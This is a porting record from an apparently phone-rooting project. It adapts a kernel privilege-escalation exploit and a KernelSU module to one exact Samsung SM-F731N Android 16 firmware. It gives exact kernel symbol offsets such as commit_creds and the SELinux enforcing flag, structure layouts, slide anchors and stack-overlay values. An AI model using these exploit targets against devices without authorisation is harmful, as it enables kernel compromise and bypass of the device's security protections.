# SM-F731N / F731NTBS5FZA1 clean port record

This record follows [`PORTING.md`](PORTING.md) and
[`../kernelsu/README.md`](../kernelsu/README.md). It contains only facts
collected for the connected `SM-F731N`, the exact FZA1 firmware, and the
matching Samsung open-source kernel package.

## Status

The Android 16 firmware Image, recovered ELF and BTF, physical load addresses,
payload symbols, structure layouts, tracefs slide anchor, MCAST stack overlay,
P0 fingerprint, release payload, exact-source KernelSU module, and matching
late-load binary have been derived and built.

All static, symbol, relocation, manifest, and reproducibility gates recorded
below pass. Hardware execution through Root My Galaxy is the remaining gate.

## 1. Runtime identity

Read directly through ADB from serial `R3CW70LN8WY`:

```text
model: SM-F731N
device: b5q
product: b5qksx
platform: kalama
display build: BP2A.250605.031.A3.F731NTBS5FZA1
fingerprint: samsung/b5qksx/b5q:16/BP2A.250605.031.A3/F731NTBS5FZA1:user/release-keys
security patch: 2026-01-01
SDK: 36
ABI: arm64-v8a
kernel release: 5.15.178-android13-8-31998796-abF731NTBS5FZA1
kernel build: #1 Fri Jan 9 02:19:22 UTC 2026
page size: 4096
sched_blocked_reason event ID: 108
```

The edition firmware uses the `F731NTB` build identifier. The runtime hardware
identity remains `SM-F731N`, `b5q`, `b5qksx`, and `kalama`.

Relevant lines from the running `/proc/config.gz` include:

```text
CONFIG_ARM64_PTR_AUTH=y
CONFIG_RKP=y
CONFIG_KDP=y
CONFIG_SHADOW_CALL_STACK=y
CONFIG_CFI_CLANG=y
CONFIG_CFI_CLANG_SHADOW=y
# CONFIG_MODULE_FORCE_LOAD is not set
CONFIG_MODVERSIONS=y
CONFIG_TRIM_UNUSED_KSYMS=y
CONFIG_KASAN=y
CONFIG_KASAN_HW_TAGS=y
CONFIG_KASAN_VMALLOC=y
```

The captured runtime config is:

```text
work/runtime/config-F731NTBS5FZA1.gz
SHA-256: a1e4154e60cfe5e5162b8fec78d1e239d6f07407965e9d94c6e438ebb472d77e
```

Runtime facilities used by the repository payload are present:

```text
/dev/ashmem mode: 0666
tracefs: mounted read-write
configfs: mounted read-write
```

After collecting the slide anchor, both tracefs states were restored:

```text
/sys/kernel/tracing/tracing_on: 0
/sys/kernel/tracing/events/sched/sched_blocked_reason/enable: 0
```

Stock integrity properties read after collection:

```text
verified boot state: green
flash locked: 1
Knox warranty bit: 0
verity mode: enforcing
```

## 2. Exact firmware Image and bootloader inputs

Firmware inputs:

```text
AP: AP_F731NTBS5FZA1_F731NTBS5FZA1_MQB105356757_REV00_user_low_ship_MULTI_CERT_meta_OS16
BL: BL_F731NTBS5FZA1_F731NTBS5FZA1_MQB105356757_REV00_user_low_ship_MULTI_CERT
boot.img.lz4 SHA-256: f97d4a9753c6d0a4463a29cde0601d3e973f20d569a84f0ad6202d72cb0f7958
abl.elf.lz4 SHA-256: 54d8eb4a26ce24f876d1af8ee8c105ae9373209ff6c2c3c4d2ea4b5b9eab8d20
uefi.elf.lz4 SHA-256: 005705078cf2d1f5ae063fd98dd8b7a06c4dfa67364b6c0da2dce7abc81de6b0
```

Recovered boot image and ARM64 Image:

```text
boot.img size: 100663296
boot.img SHA-256: 6dc727f47565f2327804a0493fed57ea66cf930d228fdb247206afbd7dc0ed85
raw Image size: 45750784
raw Image SHA-256: bcb19bd654a087aa477d5a553fe01826edcc04cf53dd46e76544537922a04212
boot header version: 4
ARM64 Image text_offset: 0x0
ARM64 Image image_size: 0x2e00000
ARM64 Image flags: 0xa
```

The Image banner matches the connected kernel release exactly.

## 3. Recovered ELF and BTF

```text
ELF: work/recovered/vmlinux.elf
ELF size: 51864979
ELF SHA-256: 44a70d41db16deb25e6f75a85ccb9d70b38617c91a3d717202038b831f6137f4
KIMAGE_TEXT_BASE: 0xffffffc008000000
numeric symbol list: work/recovered/vmlinux.nm
numeric symbol list lines: 123486
numeric symbol list SHA-256: b9805893d34e069716dc3c7acbca207deb0f77ff32d00f2a690ae3735090cacb
validated raw BTF interval: [0x211dbd4, 0x26cca09)
validated raw BTF size: 5959221
validated raw BTF SHA-256: 549ce4e8c238d97263fb2f4e0b8ec9dee7cc5b58bc77ea6ad6581bbcdcead094
raw BTF dump SHA-256: b05350b4f824ec8a152181e2840f0830bc1a0a881ec28e13d4a690caf114ce67
C BTF dump SHA-256: bdae546fedaa959b78cf920d250e99be5d35561a18c751d3dd28a44fd970d541
```

The BTF candidate passed the full header, section-bound, and initial string
table checks from `PORTING.md`. Exactly one candidate was accepted.

## 4. Exact payload symbol offsets

Every value below is an offset from `0xffffffc008000000` in the recovered
FZA1 ELF:

| Target macro or use | Exact source | Offset |
| --- | --- | ---: |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `call_usermodehelper_exec_work` | `0x00104160` |
| `PREPARE_KERNEL_CRED_OFF` | `prepare_kernel_cred` | `0x0011e048` |
| `OVERRIDE_CREDS_OFF` | `override_creds` | `0x0011ee5c` |
| `COMMIT_CREDS_OFF` | `commit_creds` | `0x0011fd84` |
| `NOOP_LLSEEK_OFF` | `noop_llseek` | `0x004b9a28` |
| `COPY_SPLICE_READ_OFF` | `generic_file_splice_read` | `0x00526b64` |
| `CONFIGFS_READ_ITER_OFF` | `configfs_read_iter` | `0x005d5ef0` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `configfs_bin_write_iter` | `0x005d6918` |
| `ASHMEM_IOCTL_OFF` | `ashmem_ioctl` | `0x010c0834` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `compat_ashmem_ioctl` | `0x010c0e90` |
| `ASHMEM_MMAP_OFF` | `ashmem_mmap` | `0x010c0ee8` |
| `ASHMEM_OPEN_OFF` | `ashmem_open` | `0x010c11c8` |
| `ASHMEM_RELEASE_OFF` | `ashmem_release` | `0x010c1260` |
| `ASHMEM_SHOW_FDINFO_OFF` | `ashmem_show_fdinfo` | `0x010c137c` |
| `ANON_PIPE_BUF_OPS_OFF` | `anon_pipe_buf_ops` | `0x01dc84a0` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `nfulnl_logger.name` target string | `0x01cbb187` |
| `ASHMEM_FOPS_OFF` | `ashmem_fops` | `0x01f47160` |
| `KMALLOC_CACHES_OFF` | `kmalloc_caches` | `0x01f9dd18` |
| `SYSTEM_UNBOUND_WQ_OFF` | `system_unbound_wq` | `0x02990800` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `nfulnl_logger` | `0x02991e48` |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `random_table[boot_id].data` | `0x02ab0338` |
| `ASHMEM_MISC_FOPS_OFF` | `ashmem_misc + 0x10` | `0x02af27a8` |
| `INIT_TASK_OFF` | `init_task` | `0x02afa840` |
| `ROOT_TASK_GROUP_OFF` | `root_task_group` | `0x02baaac0` |
| `SELINUX_ENFORCING_OFF` | `selinux_state.enforcing` | `0x02c7f430` |
| `SLIDE_SYSCTL_BOOTID_OFF` | `sysctl_bootid` storage | `0x02d1bf31` |

Binary pointer checks against the recovered ELF passed for:

- `ashmem_misc + offsetof(miscdevice, fops)` to `ashmem_fops`;
- `nfulnl_logger.name` to the exact `nfnetlink_log` string;
- `random_table[boot_id].data` to `sysctl_bootid`.

## 5. Exact BTF and runtime layouts

Required FZA1 BTF layout values:

```text
sizeof(struct file_operations) = 0x120
owner = 0x00
llseek = 0x08
read = 0x10
write = 0x18
read_iter = 0x20
write_iter = 0x28
unlocked_ioctl = 0x50
compat_ioctl = 0x58
mmap = 0x60
open = 0x70
release = 0x80
splice_read = 0xc8
show_fdinfo = 0xe0

sizeof(struct task_struct) = 0x1200
usage = 0x38
prio = 0x7c
normal_prio = 0x84
sched_task_group = 0x400
pi_lock = 0x884
pi_waiters = 0x898
pi_top_task = 0x8a8
pi_blocked_on = 0x8b0

sizeof(struct mm_struct) = 0x3e0
mm_struct.pgd = 0x40

sizeof(struct rt_mutex_waiter) = 0x58
tree = 0x00
pi_tree = 0x18
task = 0x30
lock = 0x38
wake_state = 0x40
prio = 0x44
deadline = 0x48
ww_ctx = 0x50

sizeof(struct configfs_buffer) = 0x80
page = 0x10
needs_read_fill = 0x50
bin_buffer = 0x58
bin_buffer_size = 0x60
cb_max_size = 0x64

sizeof(struct work_struct) = 0x30
data = 0x00
entry = 0x08
func = 0x18

sizeof(struct workqueue_struct) = 0x140
dfl_pwq = 0xb0

sizeof(struct pool_workqueue) = 0x100
pool = 0x00
wq = 0x08
work_color = 0x10
refcnt = 0x18
nr_in_flight = 0x1c
nr_active = 0x5c
max_active = 0x60

sizeof(struct worker_pool) = 0x380
worklist = 0x20
nr_workers = 0x30
nr_idle = 0x34

sizeof(struct page) = 0x40
compound_head = 0x08
slab_cache = 0x18
page_type = 0x30
```

The bare BTF size of `mm_struct` is not the KernelSnitch allocation stride.
The connected FZA1 device reports:

```text
mm_struct 608 608 1024 32 8
```

The exact source adds `cpumask_size()` and applies `SLAB_HWCACHE_ALIGN`, so the
runtime SLUB object size and target value are:

```c
#define MM_STRUCT_SZ 0x400
```

## 6. Physical load proof

Recovered bootloader components:

```text
abl.elf SHA-256: 6b8dd1831cd47c1970b680f3e69e8f507dd4ce05c0861b081e49a47b6f2fc1b5
LinuxLoader PE SHA-256: 49147e1f7cf1bc7478e89370e1ae683e9ee9514dc26476dedca78ba8e5f82c65
uefi.elf SHA-256: 21d6485efa6a4e1f3b354a9bdf1d77b45413245171f7ccd6eb5405fdeed4cc2b
UEFI Kernel region base: 0xa8000000
UEFI Kernel region size: 0x10000000
LinuxLoader raw-Image fallback offset: 0x80000
DDR/direct-map physical base: 0x80000000
```

FZA1 UEFI publishes the Kernel region through `KernelBaseAddr` and
`KernelSize`. Its LinuxLoader raw-Image path adds `0x80000` before transfer.
The exact target values are:

```c
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0xa8080000ULL
```

## 7. Slide and MCAST stack proof

### Tracefs anchor

`worker_thread` starts at image offset `0x0010d674`. Its blocking
`bl schedule` returns at offset `0x0010d6ec`:

```c
#define SLIDE_TRACEFS_EVENT_ID 108
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0010d6ecULL
```

The connected device produced repeated `worker_thread+0x78/0x738` callers
while the event was enabled temporarily. The event and global tracing state
were restored to their original disabled values.

### MCAST waiter overlay

The repository's existing `MCAST_JOIN_SOURCE_GROUP` stack writer was mapped
against the exact FZA1 ELF.

```text
Futex path to waiter:
__arm64_sys_futex frame:       0x080
do_futex frame:                0x140
futex_wait_requeue_pi frame:   0x1b0
waiter local offset:          +0x098
waiter address:               SP - 0x2d8

MCAST path to request:
__arm64_sys_setsockopt frame:  0x010
__sys_setsockopt frame:        0x070
sock_common_setsockopt frame:  0x010
ipv6_setsockopt frame:         0x040
do_ipv6_setsockopt frame:      0x2c0
request local offset:         +0x040
request address:              SP - 0x350
```

Therefore:

```c
#define MCAST_WAITER_OFF 0x78
```

No pselect shift or target-specific timing/reclaim override is present.

## 8. P0 fingerprint and target verification

The repository generator read all 32 candidate slides from `0x000000` through
`0x1f0000` in `0x10000` steps. Each row contains the eight qwords at page
offsets `0x000`, `0x200`, ..., `0xe00`.

```text
src/targets/b5q-F731NTBS5FZA1/p0_fingerprint.h
rows: 32
qwords verified: 256
size: 7476
SHA-256: 48a95a15ca82eb68c961f167105ecce17e484a31e271fd3bdbfd39dc71e7a738
```

The clean target header is:

```text
src/targets/b5q-F731NTBS5FZA1/target.h
size: 8938
SHA-256: a3a0d5a95f6acad0114de4a4f10acc21dc8754c1f2a2b073ce68c8aa0e301bd0
```

The automated exact-target comparison passed:

```text
ELF symbol offsets checked: 23
BTF member offsets checked: 49
BTF structure sizes checked: 2
derived pointers checked: ashmem_misc.fops, nfulnl_logger.name, random_table.boot_id.data
runtime-derived values checked: worker_thread+0x78, mm_struct SLUB object size 0x400
result: PASS
```

## 9. Payload build

The release target was built with Android NDK r29 (`29.0.14206865`):

```text
artifact: artifacts/b5q-F731NTBS5FZA1/cve-2026-43499-app.so
size: 104128
SHA-256: 0676cc3548fc7af160b87a582f1640e008fe1da35eaf180ac062338076c1f3c7
format: ELF64 little-endian AArch64 shared object
Android API: 35
NDK: r29 / 29.0.14206865
build label: b5q-F731NTBS5FZA1-clean-tracefs-mcast-configfs-pipe-root
```

Two builds from cleaned target directories were byte-identical.

## 10. Exact-source KernelSU pair

Exact Samsung source provenance:

```text
package directory: SM-F731N_KOR_16_Opensource
build target: b5q_kor_singlex
chipset: kalama
source kernel version: 5.15.178
Kernel.tar.gz SHA-256: f74704a7f6866c32f015705fa00728260463977b1a219c369ecd181d5826b1e5
Platform.tar.gz SHA-256: 34c10b89a18c0f6a4d9bd4a97bce0a2065c487c41b273c84b289af4a02821874
compiler: Android clang 14.0.7 / r450784e
```

The runtime config's obsolete Samsung internal whitelist path was replaced
with values extracted from the exact FZA1 ELF:

```text
CRC-bearing target symbols: 8427
Module.symvers.target SHA-256: 1c84962aef8eb62ce36591385ab0dce48089a481ba2dadeb8eac789ef05c151a
abi_symbollist.raw SHA-256: a2f4cc83633363accfb3a171a78f649ba2fcb6d249673ba5d9707e914caa64a2
```

No `Module.symvers` from another device was used. The generated release files
both contain:

```text
5.15.178-android13-8-31998796-abF731NTBS5FZA1
```

KernelSU source and patches:

```text
KernelSU: v3.2.5
commit: b0bc817b4e966aa6aa830834eaf6ef765d821d40
generic patch: kernelsu/patches/KernelSU-v3.2.5-samsung-kdp-rkp-defex.patch
FZA1 patch: kernelsu/patches/KernelSU-v3.2.5-b5q-fza1.patch
FZA1 patch SHA-256: a832c828e4aa0dc09463d2ff3e5f9ce78fc6b3b97a2b7162702a75fbb1886104
```

The FZA1 source declares `inc_rlimit_ucounts()` and
`dec_rlimit_ucounts()` with `enum ucount_type`; the FZA1 patch records that
exact type adaptation. The recovered FZA1 ELF contains the Samsung symbols
required by the generic patch, including `kdp_usecount_dec_and_test`,
`prepare_ro_creds`, and `kdp_assign_pgd`.

The external module was built with:

```text
CONFIG_KSU=m
CONFIG_KSU_SAMSUNG_KDP=y
CONFIG_KSU_SAMSUNG_RKP=y
CONFIG_KSU_SAMSUNG_DEFEX=y
CONFIG_KSU_SAMSUNG_NO_PATCH_TEXT=y
```

Standalone KO:

```text
artifact: kernelsu/android13-5.15.178_kernelsu-b5q-F731NTBS5FZA1-kdp.ko
size: 358304
SHA-256: 293f9b67148226888d8b5136a2fb04b873d4f9c4e71f3a330c38283d24ac0730
vermagic: 5.15.178-android13-8-31998796-abF731NTBS5FZA1 SMP preempt mod_unload modversions aarch64
undefined imports: 200
module version entries: 0
missing from exact target symbol table: 0
resolved through kallsyms rather than target exports: 64
target CRC mismatches: 0
stop_machine imports: 0
symtab/strtab retained: yes
```

Both `check_symbol` and the repository target audit pass after debug-only
stripping. A clean rebuild produced the identical 358304-byte file and hash.

Matching late-load binary:

```text
artifact: kernelsu/ksud-b5q-F731NTBS5FZA1-kdp
size: 4776064
SHA-256: 3a2a1b6531fd9b781d235b10cfa0859675f9af781f94a1c115d4fc27b1c61fc8
format: AArch64 Android 35 PIE
NDK: r29 / 29.0.14206865
embedded asset: android13-5.15_kernelsu.ko
embedded raw-DEFLATE offset: 74160
embedded compressed size: 113860
embedded decompressed size: 358304
embedded decompressed SHA-256: 293f9b67148226888d8b5136a2fb04b873d4f9c4e71f3a330c38283d24ac0730
```

The embedded bytes decompress to the exact standalone KO. A full clean Android
target rebuild produced a byte-identical `ksud`.

## 11. Publication and hardware gate

The support entry uses repository-relative paths and matches:

```text
payloadId: b5q-F731NTBS5FZA1
model: SM-F731N
kernel version: 5.15.178
```

Completed gates:

```text
exact firmware/Image/ELF/BTF provenance: PASS
target.h static derivation audit: PASS
release payload reproducibility: PASS
exact-source KernelSU patch/build: PASS
KernelSU symbol and manual-relocation audit: PASS
KO vermagic and reproducibility: PASS
ksud embedded-asset identity and reproducibility: PASS
support feed JSON/path/size validation: PASS
stock integrity state after collection: PASS
```

Remaining gate:

```text
Root My Galaxy payload and KernelSU late-load hardware execution on FZA1
```

This profile is exact-build support for Android 16 `F731NTBS5FZA1` and kernel
`5.15.178-android13-8-31998796-abF731NTBS5FZA1`.
